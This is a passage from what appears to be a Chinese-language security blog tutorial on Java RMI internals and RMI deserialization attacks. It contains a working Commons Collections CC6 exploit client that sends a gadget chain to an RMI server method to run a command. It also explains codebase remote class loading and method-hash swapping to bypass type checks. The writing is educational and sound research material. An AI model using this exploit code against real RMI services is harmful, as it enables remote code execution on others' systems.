RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>接口实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们通常使用 <code>LocateRegistry#createRegistry()</code> 方法来创建注册中心：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将待调用的类进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// 创建远程对象</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// 绑定</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以直接整合到Server处注册远程对象，使用<code>LocateRegistry#createRegistry()</code>来创建注册中心，<code>Registry#bind()</code>进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 <code>LocateRegistry.getRegistry</code> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。</p><p>这些方法的第一个参数都接收一个URL字符串，<code>rmi://host:port/name</code>，表示注册中心所在主机和端口，远程对象引用的名称。</p><p>一般注册中心和服务端都在同一主机。</p><p><strong>Client</strong></p><p>客户端也需要定义和服务端相同的远程接口，然后进行调用：</p><p><code>LocateRegistry#getRegistry()</code>连接注册中心，<code>Registry#lookup()</code>获取远程对象的存根，通过名称查找。注册中心默认端口1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里 RemoteInterface 接口在 Client&#x2F;Server&#x2F;Registry 均应该存在，只不过通常 Registry 与 Server 通常在同一端上。</p><p>RMI支持动态类加载来进行反序列化。上面的远程方法调用涉及方法参数的传递，若客户端传递了一个服务端不存在的类对象，服务端如何进行反序列化呢？</p><p>最后还有个小trick，首先是动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，若设置了<code>java.rmi.server.codebase</code>，则服务端会尝试从其地址获取 <code>.class</code> 并加载及反序列化。加载字节码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>所以，打反序列化的时候，恶意Server端可以如此存放恶意class字节码，让Client来调用从而RCE。</strong></p><p>可使用 <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> 进行设置，或使用启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> 进行指定。</p><p>接下来就是安全策略的设置，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类，通常我们使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>同样可以使用 <code>-Djava.security.policy=rmi.policy</code> 或 <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> 来进行设置。</p><h2 id="RMI底层原理总结"><a href="#RMI底层原理总结" class="headerlink" title="RMI底层原理总结"></a>RMI底层原理总结</h2><p>对于更底层部分的分析我就不献丑，网上很多大牛都写得很透彻清晰，这里我就只写写RMI-Attack行为了。</p><p>底层原理可以总结为（借用su18佬的图图）：</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>总而言之，RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。<br><span class="hljs-number">2</span>、Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。<br><span class="hljs-number">3</span>、RemoteCall 序列化 RMI 服务名称、Remote 对象。<br><span class="hljs-number">4</span>、RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。<br><span class="hljs-number">5</span>、RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。<br><span class="hljs-number">6</span>、Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。<br><span class="hljs-number">7</span>、Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。<br><span class="hljs-number">9</span>、RMI 客户端反序列化服务端结果，获取远程对象的引用。<br><span class="hljs-number">10</span>、RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。<br><span class="hljs-number">11</span>、RMI 客户端反序列化 RMI 远程方法调用结果。<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>这里我觉得su18佬的电话本比喻很恰当也很易懂，Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本。</p><p>我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。</p><p>参与一次 RMI 调用的有三个角色，分别是 Server 端，Registry 端和 Client 端。严格意义上来讲，只有 Registry 端和使用 Registry 的端，因为 Registry 端只负责查询和传递引用，真正的方法调用是不需要经过 Registry 端的，只不过注册服务的我们称之为 Server 端，使用服务的我们称之为 Client 端。</p><p><strong>有一种我只负责帮你找到人，至于你找这个人做什么非法勾当我不管的感觉</strong>，不过为了更清晰的划分不同角色，我们还是将其分为三个角色，而通常情况下，Server 端和 Registry 端是同一端。</p><p>RMI调用过程决定了三者都涉及反序列化操作，所以对这三者的攻击就呼之欲出。</p><p>大概分这几种：</p><ol><li>攻击客户端<ul><li>RegistryImp_Stub#lookup 反序列化注册中心返回的Stub</li><li>UnicastRef#invoke 反序列化远调方法的执行结果</li><li>StreamRemoteCall#executeCall 反序列化远程调用返回的异常类</li><li>DGCImpl_Stub#dirty</li></ul></li><li>攻击服务端<ul><li>UnicastServerRef#dispatch 反序列化客户端传递的方法参数</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>攻击注册中心<ul><li>RegistryImp_Stub#bind 注册中心反序列化服务端传递传来的远程对象</li></ul></li></ol><h3 id="Server-端-Attack"><a href="#Server-端-Attack" class="headerlink" title="Server 端 Attack"></a>Server 端 Attack</h3><h4 id="恶意服务参数"><a href="#恶意服务参数" class="headerlink" title="恶意服务参数"></a>恶意服务参数</h4><p>这里需要一个背景，当 Client 端获取到 Server 端创建的 Stub 后，Client 会在本地调用这个 Stub 并传递参数，Stub 会序列化这个参数并传递给 Server 端，<strong>Server 端就会反序列化 Client 端传入的参数并进行调用</strong>，如果这个参数是 <strong>Object 类型</strong>的情况下，Client 端可以传给 Server 端<strong>任意的类</strong>，直接造成反序列化漏洞。</p><p>例如我们上面写的在远程调用接口 RemoteInterface 存在一个传入Object类型的<code>sayGoodbye</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接可以传一个反序列化 payload 进去执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6直接弹calc。</p><p>如果参数类型不是 Object 类型，那能否进行攻击？</p><p>当然可以。</p><p>这里可以看一个小实验，我们在Server的接口处若使用<code>HelloObject</code>作为函数参数，Client的接口使用<code>Object</code>作为函数参数：</p><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样若想直接触发反序列化洞会报错：</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>其实可以看出，就是在服务端没有找到对应的调用方法。可以发现这个调用方法在 UnicastServerRef 的 <code>dispatch</code> 方法中在 <code>this.hashToMethod_Map</code> 中通过 Method 的 hash 来查找。</p><p>这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p><p>那有没有一种可能，<strong>我们传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）呢？</strong></p><p>答案是可以的，在 mogwailabs 的 [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p><ul><li>通过网络代理，在流量层修改数据</li><li>自定义 “java.rmi” 包的代码，自行实现</li><li>字节码修改</li><li>使用 debugger</li></ul><p>并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法。</p><p>客户端的接口也添加一个同服务端相同的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>即调试下断点的时候，在<code>RemoteObjectInvocationHandler</code>调用<code>invokeRemoteMethod</code>的时候修改method（在 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法处下断，将 Method 改为服务端存在的 HelloObject 的 Method），下面<code>getMethodHash(method)</code>获取到的哈希就和服务端的一样了，后续弹calc都一样的。</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 师傅使用了 Java Agent 的方式插桩，在<a href="https://www.anquanke.com/post/id/200860">这篇文章</a>里，0c0c0f 师傅使用了流量层的替换，在<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">这篇文章</a>里，有兴趣的师傅请自行查看。</p><p>利用这种方式，就大大的扩展了利用链。RMI 的反序列化逻辑位于 <code>sun.rmi.server.UnicastRef#unmarshalValue</code>，如下：</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>可以看到，除了基础数据类型，其他的类型均能调用 readObject 进行反序列化，甚至原本 String 类型的参数也会走 readObject 反序列化，那么结合之前的替换手段，总结起来就是：</p><blockquote><p><strong>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</strong></p></blockquote><h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>上面说过，RMI反序列化参数的时候，若在本地找不到类，会在指定的codebase下加载类，而codebase可以由客户端指定，那么这就是一个很有用的打反序列化的地方。这个特性在 6u45&#x2F;7u21 之前都是默认开启的。</p><p>为了能够远程加载目标类，需要 Server 加载并配置 SecurityManager，并设置 <code>java.rmi.server.useCodebaseOnly=false</code>。</p><p>Server 端调用 UnicastServerRef 的 <code>dispatch</code> 方法处理客户端请求，调用 <code>unmarshalParameters</code> 方法反序列化客户端传来的参数。</p><p>反序列化过程由 RMI 封装类 MarshalInputStream 来实现，会调用 <code>resolveClass</code> 来解析 Class。</p><p>无论 Server 端还是 Client 端，只要有一端配置了 <code>java.rmi.server.codebase</code>，这个属性都会跟随数据流在两端流动。</p><p><strong>因此，Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 <code>java.rmi.server.codebase</code> 地址中远程加载恶意类而触发攻击。</strong></p><h4 id="替身攻击"><a href="#替身攻击" class="headerlink" title="替身攻击"></a>替身攻击</h4><p>在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，su18师傅称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。</p><p>大体的思路就是调用的方法参数是 <code>HelloObject</code>，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。</p><p>这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。</p><h3 id="Registry-端-Attack"><a href="#Registry-端-Attack" class="headerlink" title="Registry 端 Attack"></a>Registry 端 Attack</h3><p>在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。</p><p>所以如果我们是一个恶意的 Server 端，向 Registry 端输送了一个恶意的对象，在其反序列化时就可以触发恶意调用。</p><p>这里仍然用 CC6 测试，而因为 bind 的参数是需要是 Remote 类型的，所以这里使用了 AnnotationInvocationHandler 来代理了 Remote 接口，形成了反序列化漏洞。</p><p>形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 